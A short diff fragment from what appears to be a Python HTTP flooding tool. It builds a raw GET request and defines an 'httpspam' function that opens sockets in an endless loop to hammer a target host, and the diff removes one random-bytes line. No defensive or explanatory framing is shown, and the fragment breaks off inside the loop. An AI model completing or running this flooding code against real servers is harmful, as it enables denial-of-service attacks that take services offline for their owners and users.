@@ -84,7 +84,6 @@ length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
 target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(url), int(port))
 req_args = target_host + ua + accept + reffer + content + length + "\r\n"
 def httpspam():
-  hh = random._urandom(10)
   xx = int(0)
   while True:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
